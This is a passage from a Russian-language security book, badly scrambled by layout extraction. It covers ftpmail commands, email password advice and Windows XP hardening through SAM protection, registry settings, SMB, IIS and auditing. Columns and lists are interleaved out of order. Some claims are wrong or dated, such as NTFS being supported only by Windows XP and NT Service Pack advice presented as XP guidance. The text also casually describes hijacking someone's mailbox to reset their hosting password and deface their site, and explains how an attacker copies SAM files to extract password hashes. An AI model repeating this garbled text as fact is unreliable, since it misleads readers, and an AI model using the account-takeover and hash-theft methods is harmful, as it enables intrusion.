                                                                                                                                                                                                                                                                                                                                                                                                                                                                            или www4mail). Он заключается в том, что вы посылаете на неко 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    торый почтовый адрес описание того, что надо сделать, удален 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ная машина, обрабатывающая ваше послание выполняет записан 
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         ные там команды и возвращает вам письмо с файлом. 
После того, как я порылся в своих записях, мне удалось об
наружить этот сервер: ftpmail@afn.org. При составлении письма
можно использовать эти команды:
E mail «безопасная»
97
Установить соединение с некоторым сайтом
dir
Показать содержимое текущего каталога
quit
Окончание сессии
chdir/cd
Сменить директорию
binary
Перейти в двоичный режим передачи данных
get <file_name>
Получить файл
Защита
Представим, что твой логин: cooluser.
1. Ни в коем случае пароль не должен совпадать с логином:
cooluser.
2. Лучше вообще не использовать маску логина для пароля:
coolusercool, cool100user, user123 или даже cooluserqwerty.
3. Не надо использовать цифровые пароли: 123456, 31337
или вообще 111!
4. Не надо использовать короткие пароли (их можно взло
мать Brute Forse, т.е. атакой прямого полного перебора): iq, me
или 1.
5. Не надо использовать словарные слова (тоже можно взло
мать перебором по словарю, которых сейчас очень много в Inter
net) kruto, lamer или xakep.
98
E mail «безопасная»
Безопасность E mail
Безопасность E mail
Как же запомнить все эти правила? Всё просто: запомни как
надо делать! Делай пароли длиннее 8 ми символов, которые со
держат цифры и символы разного регистра вперемешку, типа:
zZ0YaKa!31l4B#d.
Также лучше сделать ящик, на который будет фордиться все
твое мыло (так называемые «Адреса пересылки»), для того чтобы
при захвате твоей мыльницы, ты мог снимать почту, хотя хакер,
осмелившийся захватить твое мыло, может отключить эту функ
цию на серваке. Пароли на эти ящики соответственно должны
быть тоже разными.
Можно как либо ещё обезопасить информацию в ящике от
несанкционированного (т.е. непредвиденного тобой) прочтения?
Можно! Дружно шифруем самые важные письма программой PGP
(Pretty Good Privacy). Работая в мастдае, конечно лучше пользо
ваться PGP для этой операционки. Установка этой программы ин
туитивно проста.
Поговорим немного о истории создания и принципах ис
пользования этой проги, в смысле метода шифрации. Криптогра
фия и крякинг (в смысле взлом паролей) очень связанные вещи
(как брат и сестра). Тут и нечего оспаривать, основная проблема
и головная боль Администраторов серваков, как бы надежно со
хранить для себя и сделать абсолютно недоступно для других не
кую информацию. А это, как видите, прямая задача криптогра
фии. Конкретно про PGP: лично я ей не пользуюсь, потому что
это слишком нудно шифровать каждое сообщение, когда по E
mail почти в режиме он лайн обсуждаешь последние новости ха
кинга. Но сам процесс шифрования я советую знать (для общего
развития!). Я также предлагаю ознакомиться с подробнейшим хел
пом по эксплуатации PGP for Windows 9x, правда на английском
языке!
удалит письма от подружки из чата, которую ты уломал вчера за
тусоваться к тебе домой. Можно поставить защиту от флуда на са
мом почтовом серваке. Есть там опция, которая не позволяет при
нимать письма на ваш ящик размером более 100 КилоБаб (это ты
устанавливаешь ручками). Это частично решает проблему.
Только не спрашивайте, зачем вам чужие ящики, а хотя бы
для того чтобы собирать классные 6 ти значные юины аси, или...
у каждого свои идеи на этот счет. Ну, например, у владельца мы
ла, которое ты захватил, есть пага на халявном серваке, ты идешь
на пагу этого хостинга в раздел напоминания пароля, делаешь
свои черные делишки и пароль приходит на мыло. Ты дефэйсишь
пагу и становишься крутым кул хацкером. Так же история если
«атакуемый объект» зарабатывает на каком нибудь спонсоре.
Теперь можно подвести итоги. В целом, как ты заметил, су
ществует масса способов хакнуть мыльник. Твой ящик находится
в относительной безопасности. Ящиков очень много (ну просто
очень много) и лично я не знаю таких маньяков в Internet, кото
рые бы целый день только и делали, что ломали чьи то ящики! Да
и статистика в целом показывает, что это происходит крайне
редко!
Знай, пользуйся, но не увлекайся, ибо все люди — братья,
а Земля круглая.
Ты скажешь: всякое бывает, что делать, если зафлудили мой
ящик? Не горюй, коллЭга! Воспользуйся программой HackTek.
Она быстренько расчистит весь флуд у тебя в ящике. Единствен
ная маленькая неприятность — это то, что она вместе с флудом
E mail «безопасная»
99
100
E mail «безопасная»
Безопасная Windows XP
Безопасная Windows XP
Безопасная Windows XP
Физическая защита
К физическим средствам защиты относится:
■ обеспечение безопасности помещений, где
                                      размещены серверы сети;
■ ограничение посторонним лицам физического
                                         доступа к серверам, концентраторам, коммутаторам,
                                                                                  сетевым кабелям и другому оборудованию;
■ использование средств защиты от сбоев электросети.
Наиболее интересным является раздел учетных записей
пользователей: в них хранится информация об именах и паролях.
Следует заметить, что пароли не хранятся в текстовом виде. Они
защищены процедурой хеширования. Это не значит, что, не зная
пароля в текстовом виде, злоумышленник не проникнет в систе
му. При сетевом подключении не обязательно знать текст пароля,
достаточно хешированного пароля. Поэтому достаточно получить
копию базы данных SAM и извлечь из нее хешированный пароль.
При установке системы Windows XP доступ к файлу %Sys
temroot%\System32\Config\sam для обычных программ заблокиро
ван. Однако, используя утилиту Ntbackup, любой пользователь с
правом Back up files and directories может скопировать его. Кроме
того, злоумышленник может попытаться переписать его копию
(Sam.sav) из каталога %Systemroot%\System32\Config или архив
ную копию (Sam._) из каталога %Systemroot%\Repair.
Поэтому для защиты информации, хранящейся в базе дан
ных SAM, необходимо следующее:
Администрирование учетных записей
■ ■ ■ ■ учетные записи доменов.
отменить кэширование информации о безопасности
                                         на компьютерах домена (имена и пароли последних
                                                                                десяти пользователей, регистрировавшихся ранее на
                                                                                                                           данном компьютере, сохраняются в его локальном
                                                                                                                                                                  реестре). Используя утилиту Regedt32, добавить в
учетные записи компьютеров домена;
■ после установки или обновления удалить файл
                                         Sam.sav;
учетные записи групп;
■ ограничить количество пользователей с правами
                                            Backup Operators и Server Operators;
учетные записи пользователей;
■ исключить загрузку серверов в DOS режиме (все
                                      разделы установить под NTFS, отключить загрузку с
                                                                           флоппи и компакт дисков, желательно установить
                                                                                                                  на BIOS пароль (хотя эта мера уже давно устарела,
                                                                                                                                                    поскольку некоторые версии BIOS имеют «дырки»
                                                                                                                                                                                       для запуска компьютера без пароля, все таки
                                                                                                                                                                                                                          злоумышленник потеряет на этом время для входа в
                                                                                                                                                                                                                                                                  систему);
■ 
В функции Менеджера учетных записей входит поддержка
механизма идентификации и проверки подлинности пользовате
лей при входе в систему. Все необходимые настройки хранятся в
базе данных Менеджера учетных записей. К ним относится:
База данных Менеджера учетных записей представляет со
бой куст системного реестра, находящегося в ветви HKEY_
LOCAL_MACHINE, и называется SAM. Как и все остальные ку
сты, он хранится в отдельном файле в каталоге %Systemroot%\Sys
tem32\Con fig, который также носит название SAM. В этом ката
логе обычно находятся минимум два файла SAM: один без
расширения – сама база учетных записей; второй имеет расшире
ние .log – журнал транзакций базы.
E mail «безопасная»
101
102
E mail «безопасная»
Безопасная Windows XP
Безопасная Windows XP
■
реестр в раздел HKEY_LOCAL_MACHINE\Microsoft
Windows NT\CurrentVersion\WinLogon: параметр
CachedLogonsCount, тип REG_SZ, значение 0.
Один из популярных методов проникновения в систему —
подбор пароля. Для борьбы с этим обычно устанавливают блоки
ровку учетной записи пользователя (Account Lockout) после опре
деленного числа неудачных попыток входа, используя для этого
утилиту User Manager в диалоговом окне Account Policy, доступ
ном через меню Polcies/Accounts.
Приятным исключением является учетная запись админис
тратора. И если он имеет право на вход через сеть, это открыва
ет лазейку для спокойного угадывания пароля.
■
■
для защиты рекомендуется переименовать
пользователя Administrator, установить блокировку
учетных записей, запретить администратору вход в
систему через сеть, запретить передачу SMB пакетов
через TCP/IP (порты 137,138,139), установить
протоколирование неудачных входов.
необходимо ввести фильтрацию вводимых
пользователем паролей, установить Service Pack 2
или 3 (используется динамическая библиотека Pass
filt.dll). Данная библиотека при создании нового
пароля проверяет, что:
■ длина пароля не менее шести символов;
■ содержит три набора из четырех
                             существующих:
■ прописные группы латинского алфавита
                                    A, B, C, ..., Z;
■ 
Если этот параметр уже существует и содержит величину
FPNWCLNT (File Personal NetWare Client), то допишите новую
строку под FPNWCLNT. Если же вам мало наборов фильтра, то
создайте свою библиотеку, используя статью Q151082 в Microsoft
KnowledgeBase, где приведен пример написания модуля фильтра.
Защита файлов и каталогов (папок)
Операционная система Windows XP поддерживает файловые
системы FAT (File Allocation Table) и NTFS (New Technology File
System). Напомним, что первая поддерживается такими известны
ми операционными системами, как MS DOS, Windows 2000, Win
dows 95/98 и OS/2, вторая — только Windows XP. У FAT и NTFS
различные характеристики производительности, разный спектр
предоставляемых возможностей и т.д. Основное отличие файло
вой системы NTFS от других (FAT, VFAT (Virtual File Allocation
Table), HPFS) состоит в том, что только она одна удовлетворяет
стандарту безопасности C2, в частности, NTFS обеспечивает за
щиту файлов и каталогов при локальном доступе.
арабские цифры 0, 1, 2, ..., 9;
E mail «безопасная»
пароль не состоит из имени пользователя или
любой его части.
Для включения данной фильтрации необходимо в реестре в
разделе HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
Control\Lsa добавить параметр Notification Packages, тип REG_
MULTI_SZ, значение PASSFILT.
строчные группы латинского алфавита a,
                               b, c, ..., z;
■ 
■
Защиту ресурсов с использованием FAT можно организо
вать с помощью прав доступа:
■ ■ 
104
Чтение
Запись
■ 
103
не арифметические (специальные)
символы, такие, как знаки препинания.
Полный.
E mail «безопасная»
Безопасная Windows XP
Безопасная Windows XP
■ 
Поскольку файлы и каталоги в Windows XP являются объ
ектами, контроль безопасности осуществляется на объектном
уровне. Дескриптор безопасности любого объекта в разделе NTFS
содержит два списка контроля доступа (ACL) — дискреционный
(discretionary ACL (DACL)) и системный (system ACL (SACL)).
В операционной системе Windows XP управление доступом
к файлам и каталогам NTFS возлагается не на администратора, а
на владельца ресурса и контролируется системой безопасности с
помощью маски доступа (access mask), содержащейся в записях
списка контроля доступа ACL.
Маска доступа включает стандартные (Synchronize, Write_
Owner, Write_Dac, Read_Control, Delete), специфические (Read
(Write)_Data, Append_Data, Read(Write)_Attributes, Read(Write)_
ExtendedAttributes, Execute) и родовые (Generic_Read(Write), Gener
ic_Execute) права доступа. Все эти права входят в дискреционный
список контроля доступа (DACL). Вдобавок маска доступа содер
жит бит, который соответствует праву Access_System_Security. Это
право контролирует доступ к системному списку контроля досту
па (SACL).
В списке DACL определяется, каким пользователям и груп
пам разрешен или запрещен доступ к данному ресурсу. Именно
этим списком может управлять владелец объекта.
Список SACL задает определенный владельцем тип досту
па, что заставляет систему генерировать записи проверки в сис
темном протоколе событий. Только системный администратор уп
равляет этим списком.
индивидуальные — набор прав, позволяющий
                                   предоставлять пользователю доступ того или иного
                                                                             типа;
■ стандартные — наборы индивидуальных разрешений
                                              для выполнения над файлами или каталогами
                                                                                 действий определенного уровня;
■ 
Таким образом, можно рекомендовать создавать дисковые
разделы NTFS вместо FAT. Если все же необходимо использовать
раздел FAT, то его надо сделать отдельным разделом для прило
жений MS DOS и не размещать в нем системные файлы Windows
XP.
специальные — комбинация индивидуальных
                                    разрешений, не совпадающие ни с одним
                                                                  стандартным набором.
По умолчанию при инсталляции Windows XP и файловой
системы NTFS устанавливаются довольно «свободные» разреше
ния, позволяющие обычным пользователям получать доступ к ря
ду системных файлов и каталогам. Например, каталоги %system
root% и %systemroot%\system32 имеют по умолчанию разрешение
Change для группы Everyone. Если после установки Windows XP
FAT впоследствии был преобразован в NTFS, то данное разреше
ние для этой группы устанавливается на все файлы и подкатало
ги каталога %systemroot%. Защита данных каталогов заключается
в грамотной установке разрешений.
Количество пользователей с правами администратора реко
мендуется свести к минимуму. Учетную запись Guest лучше вооб
ще удалить, хотя она при установке (по умолчанию) и так отклю
чена, а вместо этой учетной записи создать для каждого
пользователя свою временную учётную запись с соответствующи
ми разрешениями и правами.
Защита реестра
На самом же деле для администрирования используются не Системный реестр (registry) Windows XP – это база данных,
                                               отдельные права доступа, а разрешения (permissions) NTFS. Раз содержащая информацию о конфигурации и значениях парамет
                                                                                  решения подразделяются на: ров всех компонентов системы (устройствах, операционной сис
                                                                                                                                                                                      теме и приложениях). Основные кусты реестра находятся в ветви
                                                                                                                                                                                                                                        HKEY_LOCAL_MACHINE и называются SAM, SECURITY,
                                                                                                                                                                                                                                                  SOFTWARE и SYSTEM.
E mail «безопасная» 106
105
E mail «безопасная»
Безопасная Windows XP
Безопасная Windows XP
Куст SAM – это база данных Менеджера учетных записей, Block), называемый просто сервером или LAN Manager сервером.
                                          SECURITY хранит информацию, используемую локальным Мене SMB осуществляет проверку подлинности клиента, пытающегося
                                                                                   джером безопасности (LSA). В кусте SOFTWARE находятся пара получить доступ к информации по сети. Существует два режима
                                                                                                                        метры и настройки программного обеспечения, а в SYSTEM со работы системы контроля: проверка на уровне ресурса (Share
                                                                                                                                                                  держатся данные о конфигурации, необходимые для загрузки Level) и проверка на уровне пользователя (User Level). Windows
                                                                                                                                                                                                                   операционной системы (драйверы, устройства и службы). XP не поддерживает доступ на уровне ресурса.
Доступ пользователей к полям реестра следует разграничить. При проверке на уровне пользователя сервер выполняет
                                                   Это можно осуществить с помощью утилиты Regedt32. идентификацию пользователя на основе базы учетных записей.
                                                                                                                                                                                         Протокол SMB обеспечивает защиту в начальный момент сеанса,
                                                                                                                                                                                                                                        затем все данные пользователя передаются по сети в открытом ви
                                                                                                                                                                                                                                                                                            де. Если вы хотите обеспечить конфиденциальность информации,
                                                                                                                                                                                                                                                                                                                                               необходимо использовать программные или аппаратные средства
                                                                                                                                                                                                                                                                                                                                                                                                    шифрования транспортного канала (например, PPTP, входящего
                                                                                                                                                                                                                                                                                                                                                                                                                                                 в Windows NT).
Установленные в системе по умолчанию разрешения на до
ступ к разделам реестра нельзя модифицировать рядовым пользо
вателям. Поскольку некоторые разделы реестра доступны членам
группы Everyone, после установки Windows XP необходимо изме
нить разрешения в разделе.
Для доступа к разделу HKEY_LOCAL_MACHINE\Software\
Microsoft\Windows NT\CurrentVersion\PerfLib можно вообще уда
лить группу Everyone, а вместо нее добавить группу INTERAC
TIVE с правом Read.
Для ограничения удаленного доступа к системному реестру
Windows XP используется запись в разделе HKEY_LOCAL_
MACHINE\System\CurrentcontrolSet\Control\SecurePipeServers\
winreg. По умолчанию право удаленного доступа к реестру имеют
члены группы Administrators. В Workstation этот раздел отсутству
ет, и его необходимо создать. Право удаленного доступа к реест
ру получают только пользователи и группы, указанные в списке
прав доступа к указанному разделу. К некоторым разделам реест
ра необходимо предоставить доступ по сети другим пользователям
или группам; для этого эти разделы можно указать в параметрах
Machine и Users подраздела HKEY_LOCAL_MACHINE\System\
CurrentControlSet\Contro\SecurePipeServers\winreg\AllowedPaths.
Сеансы протокола SMB можно подделать или перехватить.
Шлюз может перехватить сеанс SMB и получить такой же доступ
к файловой системе, как и легальный пользователь, инициирую
щий сеанс. Но шлюзы редко используются в локальных сетях. А
если такую попытку предпримет компьютер в сети Ethernet или
Token Ring, в которой находится клиент или сервер SMB, то это
вряд ли удастся, поскольку перехватывать пакеты достаточно
трудно.
Безопасность сервера SMB Возможность передачи по сети пароля пользователя в от
                                                                                         крытом виде делает систему уязвимой. После установки Service
                                                                                                                                     Pack 3 в операционной системе автоматически отключает возмож
                                                                                                                                                                                    ность передачи пароля в открытом виде, но существуют SMB сер
                                                                                                                                                                                                                                  веры, не принимающие шифрованный пароль (например, Lan
                                                                                                                                                                                                                                                                           Manager для UNIX). Чтобы включить передачу «открытого» паро
                                                                                                                                                                                                                                                                                                                 ля, необходимо установить в реестре в разделе HKEY_LOCAL_
                                                                                                                                                                                                                                                                                                                                                      MACHINE\SYSTEM\CurrentControlSet\Services\LanManServer\
                                                                                                                                                                                                                                                                                                                                                     Parametrs параметр EnablePlainTextPassword, тип REG_DWORD,
                                                                                                                                                                                                                                                                                                                                                               значение 1.
Доступ к файлам и принтерам по сети в операционной си Следует отметить, что корпорация Microsoft модифицирова
                                            стеме Windows XP обеспечивает сервер SMB (Server Message ла протокол SMB, который назван SMB Signing. При этом клиент
E mail «безопасная» 108
107
E mail «безопасная»
Безопасная Windows XP
Безопасная Windows XP
и сервер проверяют подлинность каждого сообщения, поступаю
щего по протоколу SMB. Для этого в каждое сообщение SMB по
мещается электронная подпись, удостоверяющая знание пароля
пользователя клиентом или сервером, пославшим это сообщение.
Таким образом, электронная подпись удостоверяет, что команда
SMB, во первых, создана стороной, владеющей паролем пользо
вателя; во вторых, создана в рамках именно этого сеанса; и, в
третьих, сообщение, передаваемое между сервером и клиентом, —
подлинник.
Безопасность сервера IIS
Microsoft Internet Information Server (IIS) был создан для
унификации работы всех служб Internet. Он представляет собой
высокоинтегрированный пакет серверных служб поддержки
HTTP, FTP и Gopher.
Защита IIS основана на средствах обеспечения безопаснос
ти Windows NT. В их число входят:
■ учетные записи пользователей. Для предотвращения
                                              несанкционированного доступа к узлу IIS следует
                                                                                    контролировать учетные записи пользователей. К
                                                                                                                            основным методам защиты также относятся:
                                                                                                                                                              применение формуляра «Гость из Internet»,
                                                                                                                                                                                         регистрация по имени и паролю пользователя (по
                                                                                                                                                                                                                               схеме аутентификации Windows NT) и выбор
                                                                                                                                                                                                                                                       сложных для угадывания паролей;
■ установка NTFS;
■ права доступа. Основным механизмом доступа через
                                             сервер IIS является анонимный доступ. Из
                                                                           механизмов проверки подлинности лишь Windows
                                                                                                           XP Challenge Response, используемый сервером
                                                                                                                              HTTP, можно считать относительно защищенным.
                                                                                                                                                               Поэтому не применяйте для аутентификации
                                                                                                                                                                                                  базовую схему, так как имя пользователя и пароль
                                                                                                                                                                                                                                         при этом передаются по сети открытым способом;
■ уменьшение числа протоколов и отключение службы
                                             Server. Уменьшив число протоколов, которыми
                                                                           пользуются сетевые адаптеры, вы заметно усилите
                                                                                                                   защиту. Чтобы пользователи не смогли
                                                                                                                                                 просматривать разделяемые ресурсы IIS, отключите
                                                                                                                                                                                        службу Server. Отключение этой службы затруднит
                                                                                                                                                                                                                          злоумышленникам поиск слабых мест в вашей
                                                                                                                                                                                                                                                             системе;
Для включения проверки электронных подписей в сообще
ния SMB необходимо установить Service Pack 3 и произвести ус
тановку параметров в реестре сервера и клиента, для сервера — в
разделе HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\
Services\LanManServer\Parametrs параметр EnableSecuritySignature,
тип REG_DWORD, значение 1.
Если значение равно 0 (по умолчанию), то поддержка SMB
Signing на сервере выключена. В отличие от сервера у клиента зна
чение EnableSecuritySignature по умолчанию уже равно 1.
При инициализации сервера образуются папки администра
тивного назначения (Administrative shares), которые обеспечивают
доступ к корневому каталогу тома. Доступ к этим ресурсам по
умолчанию разрешен только членам групп Administrators, Backup
Operators, Server Operators и Power Users. Если вы хотите отменить
доступ к ним, то необходимо в реестре в разделе HKEY_LOCAL_
MACHINE\SYSTEM\CurrentControlSet\Services\LanManServer\
Parametrs параметр AutoShareServer, тип REG_DWORD, значение
0 или, используя утилиту System Policy Editor, снять флажки с па
раметров Create Hidden Drive Shares в разделе Windows XP Net
work\Sharing.
Необходимо ограничить права анонимного пользователя.
Инсталляция Service Pack 3 закрывает доступ к реестру системы
для анонимного пользователя.
E mail «безопасная»
109
110
E mail «безопасная»
Безопасная Windows XP
■
Безопасная Windows XP
защита информации в FTP. FTP всегда использует
защиту на уровне пользователя. Это значит, что для
доступа к серверу FTP пользователь должен пройти
процедуру регистрации. Сервис FTP сервера IIS для
идентификации пользователей, желающих получить
доступ, может использовать базу данных
пользовательских бюджетов Windows XP Server.
Однако при этой процедуре FTP передает всю
информацию только открытым текстом, что создает
опасность перехвата пользовательских имен и
паролей.
Проблема раскрытия паролей устраняется при таких конфи
гурациях сервера FTP, когда он разрешает анонимный доступ.
При анонимном входе пользователь должен ввести в качестве
пользовательского имени anonymous и свой почтовый (e mail) ад
рес — в качестве пароля. Анонимные пользователи получают до
ступ к тем же файлам, доступ к которым разрешен бюджету
lVSR_computemame.
Кроме того, к сервису FTP сервера IIS Windows XP можно
разрешить исключительно анонимный доступ. Такой вариант хо
рош тем, что при нем отсутствует возможность рассекречивания
паролей в общей сети. Анонимный доступ к FTP разрешен по
умолчанию.
■
■
контроль доступа по IP адресу. Существует
дополнительная возможность контроля доступа к
серверу IIS — разрешение или запрещение доступа с
конкретных IP адресов. Например, можно запретить
доступ к своему серверу с определенного IP адреса;
точно так же можно сделать сервер недоступным для
целых сетей. С другой стороны, можно разрешить
доступ к серверу только определенным узлам;
схемы шифрования. Чтобы обеспечить безопасность
пакетов во время их пересылки по сети, приходится
применять различные схемы шифрования.
E mail «безопасная»
111
Необходимость в такой защите вызвана тем, что при
пересылке пакетов по сети не исключен перехват
кадров. Большинство схем шифрования работает
внутри прикладного и транспортного уровня модели
OSI. Некоторые схемы могут работать и на более
низких уровнях. Используются такие протоколы,
как: SSL, PCT, SET, PPTP, PGP.
Аудит
Аудит — одно из средств защиты сети Windows NT. С его
помощью можно отслеживать действия пользователей и ряд сис
темных событий в сети. Фиксируются следующие параметры, ка
сающиеся действий, совершаемых пользователями:
■ выполненное действие;
■ имя пользователя, выполнившего действие;
■ дата и время выполнения.
Аудит, реализованный на одном контроллере домена, рас
пространяется на все контроллеры домена. Настройка аудита поз
воляет выбрать типы событий, подлежащих регистрации, и опре
делить, какие именно параметры будут регистрироваться.
В сетях с минимальным требованиям к безопасности под
вергайте аудиту:
■ успешное использование ресурсов, только в том
                                          случае, если эта информация вам необходима для
                                                                                планирования;
■ успешное использование важной и
                               конфиденциальной информации.
В сетях со средними требованиями к безопасности подвер
гайте аудиту:
■
112
успешное использование важных ресурсов;
E mail «безопасная»
Безопасная Windows XP
Безопасная Windows XP
■ удачные и неудачные попытки изменения стратегии
                                             безопасности и административной политики;
■ успешное использование важной и
                               конфиденциальной информации.
В сетях с высокими требованиями к безопасности подвер
гайте аудиту:
■ удачные и неудачные попытки регистрации
                                      пользователей;
■ удачное и неудачное использование любых ресурсов;
■ 
информацию, выдаваемую различными
приложениями. Список событий, регистрируемых в
этом журнале, определяется разработчиками
приложений. Журнал находится в файле Appevent.evt.
Все журналы размещены в папке %Systemroot%\System32\
Config.
При выборе событий для проведения аудита следует учиты
вать возможность переполнения журнала. Для настройки журна
ла используйте диалоговое окно Event Log Settings.
удачные и неудачные попытки изменения стратегии
                                         безопасности и административной политики.
С помощью этого окна можно управлять:
■ ■ 
■
■
■
Журнал безопасности (Security Log) содержит
информацию об успешных и неудачных попытках
выполнения действий, регистрируемых средствами
аудита. События, регистрируемые в этом журнале,
определяются заданной вами стратегией аудита.
Журнал находится в файле Secevent.evt.
Overwrite Events Older then X Days – в случае
        заполнения журнала при записи новых событий
                                             удаляются самые события, но только если они
                                                                                старше Х дней, иначе новые события будут
                                                                                                                проигнорированы;
■ 
Системный журнал (system log) содержит сообщения
об ошибках, предупреждения и другую информацию,
исходящую от операционной системы и компонентов
сторонних производителей. Список событий,
регистрируемых в этом журнале, предопределен
операционной системой и компонентами сторонних
производителей и не может быть изменен
пользователем. Журнал находится в файле
Sysevent.evt.
Overwrite Events as Need – в случае заполнения
                  журнала при записи новых событий операционная
                                                         система удаляет самые старые события;
■ 
Windows XP записывает события в три журнала:
методикой замещения устаревших записей журнала;
■ 
Аудит приводит к дополнительной нагрузке на систему, по
этому регистрируйте лишь события, действительно представляю
щие интерес.
размером архивируемых журналов (размер по
                                   умолчанию – 512 Кбайт, можно изменить размер от
                                                                       64 до 4 194 240 Кбайт.);
Do not Overwrite Events – в случае заполнения
                  журнала новые события не фиксируются. Очистка
                                                        журнала производится вручную.
Для просмотра информации об ошибках и предупреждени
ях, а также об успешных и неудачных запусках задач использует
ся программа Event Viewer.
По умолчанию аудит выключен, и журнал безопасности не
ведется.
Журнал приложений (Application Log) содержит
сообщения об ошибках, предупреждения и другую
E mail «безопасная»
113
114
E mail «безопасная»
Безопасная Windows XP
Безопасная Windows XP
Первый этап планирования стратегии аудита — выбор под
лежащих аудиту событий в диалоговом окне Audit Policy утилиты
User Manager for Domains (User Manager).
в диспетчере пользователей и с помощью редактора
реестра установить значение параметра: ветвь
HKEY_LOCAL_MACHINE\System\CurrentCon
trolSet\Control\Lsa, имя AuditBaseObjects, тип
REG_DWORD, значение 1.
Приведем типы событий, которые могут регистрироваться:
■ Logon and Logoff – регистрация пользователя в
                             системе или выход из нее, а также установка и
                                                                разрыв сетевого соединения;
■ File and Object Access – доступ к папкам, файлам и
                         принтерам, подлежащим аудиту;
■ Use of User Rights – использование привилегий
                            пользователей (кроме прав, связанных с входом и
                                                                  выходом из системы);
■ User and Group Management – создание, изменение и
                       удаление учётных записей пользователей и групп, а
                                                                также изменения в ограничениях учётной записи;
■ Security Policy Changes — изменения в привилегиях
                          пользователей, стратегии аудита и политике
                                                              доверительных отношений;
■
■
■
Restart, Shutdown and System — перезапуск или
выключение компьютера пользователем;
возникновение ситуации, влияющей на безопасность
системы;
Службы безопасности
Система безопасности Windows XP позволяет реализовать
все новые подходы к проверке подлинности пользователя и защи
ты данных. В ее состав входит:
■ полное интегрирование с активным каталогом Win
                                         dows XP для обеспечения масштабируемого
                                                                     управления учетными записями в больших доменах с
                                                                                                              гибким контролем доступа и распределением
                                                                                                                                                  административных полномочий;
■ протокол проверки подлинности Kerberos версии 5 —
                                      стандарт безопасности для Internet, реализуемый как
                                                                          основной протокол проверки подлинности входа в
                                                                                                                  сеть;
■ проверка подлинности с применением сертификатов,
                                              основанных на открытых ключах;
■ безопасные сетевые каналы, базирующиеся на
                                        стандарте SSL;
Process Tracking — события, которые вызывают
запуск и завершение программ.
Дополнительно рассмотрим следующие типы аудита:
■
Аудит базовых объектов. Кроме файлов и папок,
принтеров и разделов системного реестра в Windows
XP есть базовые объекты, которые рядовому
пользователю не видны. Они доступны только
разработчикам приложений или драйверов устройств.
Для включения аудита этих объектов необходимо
разрешить аудит событий типа File and Object Access
E mail «безопасная»
Аудит привилегий. Среди возможных прав
пользователя существуют некоторые привилегии,
которые в системе не проверяются даже тогда, когда
аудит на использовании привилегии включен. Для
включения аудита данных привилегий необходимо,
используя редактор реестра, добавить следующий
параметр: ветвь
HKEY_LOCAL_MACHINE\System\CurrentCon
trolSet\Control\Lsa, имя FullPrivilegeAuditing, тип
REG_BINARY, значение 1.
115
116
E mail «безопасная»
Безопасная Windows XP
■
Безопасная Windows XP
файловая система с шифрованием.
Распределенные службы безопасности Windows XP сохраня
ют сведения об учетных записях в активном каталоге. Достоинст
ва активного каталога:
■
пасности и сделать возможным взаимодействие в гетерогенных
сетях, в Windows NT поддерживается несколько протоколов безо
пасности. Архитектура Windows NT не устанавливает ограничений
на применение тех или иных протоколов безопасности.
Windows XP будет поддерживать:
Учетные записи пользователей и групп можно
распределить по контейнерам — подразделениям
(Organization Unit, OU). Домен в рамках
иерархического пространства имен может содержать
любое количество подразделений. Это позволяет
организациям добиться согласования между
используемыми в сети именами и структурой
предприятия.
■ ■ Службы тиражирования каталога поддерживают
                                              множественные копии учетных записей. Теперь
                                                                                   обновление информации можно выполнить для
                                                                                                                       любой копии учетной записи (не требуется
                                                                                                                                                        разделения контроллеров домена на главный и
                                                                                                                                                                                             резервные). Протокол Light weight Directory Access
                                                                                                                                                                                                             Protocol (LDAP) и службы тиражирования
                                                                                                                                                                                                                                обеспечивают механизмы для связи каталога Windows
                                                                                                                                                                                                                                                                    XP с другими основанными на Х.500 и LDAP
                                                                                                                                                                                                                                                                                          каталогами на предприятии.
117
протокол распределенной проверки подлинности
                                        паролей (Distributed Password Authentication, DPA);
                                              благодаря DPA пользователь, получивший один
                                                                                пароль при регистрации, может подсоединяться к
                                                                                                                       любому узлу Интернета, обслуживаемому данной
                                                                                                                                                             организацией;
■ протоколы, основанные на открытых ключах и
                                       применяемые в основном для связи между
                                                                       программами просмотра и Web серверами.
                                                                                                    Стандартом de facto здесь стал протокол Secure
                                                                                                                              Sockets Layer (SSL).
Для единообразного обращения к различным протоколам
разработан новый интерфейс прикладного программирования
Win32 — интерфейс поставщиков поддержки безопасности (Secu
rity Support Provider Interface, SSPI). SSPI позволяет изолировать
проверку подлинности пользователя, которая может осуществ
ляться по разным протоколам, — от применяющих ее служб и
приложений. Интерфейс SSPI представляет собой несколько на
боров
доступных
прикладным
программам
процедур,
выполняющих:
■
Для того чтобы обеспечить совместимость с существующи
ми клиентами, предоставить более эффективные механизмы безо
E mail «безопасная»
протокол проверки подлинности Kerberos версии 5,
                                заменяющий NTLM в роли основного протокола для
                                                                   сетевого доступа к ресурсам доменов Windows XP;
■ Администрирование учетных записей улучшено
                                          благодаря новым графическим средствам управления
                                                                                     активным каталогом, а также обращающихся к
                                                                                                                        СОМ объектам активного каталога сценариям.
протокол проверки подлинности Windows NT LAN
                          Manager (NTLM), используемый в Windows XP и в
                                        предыдущих версиях Windows NT;
■ Активный каталог поддерживает гораздо большее
                                            количество объектов и с более высокой
                                                                           производительностью, чем реестр. Дерево
                                                                                                            объединенных доменов Windows NT способно
                                                                                                                                      поддерживать существенно более сложные
                                                                                                                                                                        организационные структуры.
■ ■ 
118
управление мандатами (Credential Management)
работу с информацией о клиенте (пароль, билет);
E mail «безопасная»
Безопасная Windows XP
Шифрование и безопасность
■ управление контекстом (Context Management) —
                         создание контекста безопасности клиента;
■ поддержку передачи сообщений (Message Support) —
                               проверку целостности переданной информации
                                                                     (работает в рамках контекста безопасности клиента);
■ управление пакетами (Package Management) — выбор
                            протокола безопасности.
Протокол проверки подлинности Kerberos определяет взаи
модействие между клиентами и службой проверки подлинности
Центром распределения ключей (Key Distribution Center, KDC).
Домен Windows XP эквивалентен царству Kerberos (Kerberos
realm), но будет в этой операционной системе по прежнему назы
ваться доменом. Реализация Kerberos в Windows XP основана на
документе RFC1510. По сравнению с NTLM у протокола провер
ки подлинности Kerberos имеются следующие преимущества:
■
■
более быстрое подсоединение клиента к серверу;
поскольку сервер для проверки подлинности
пользователя не должен связываться с контроллером
домена, улучшение масштабируемости компьютерной
сети;
транзитивные доверительные отношения между
доменами упрощают администрирование сложной
сети.
В Windows XP появилось средство защиты информации —
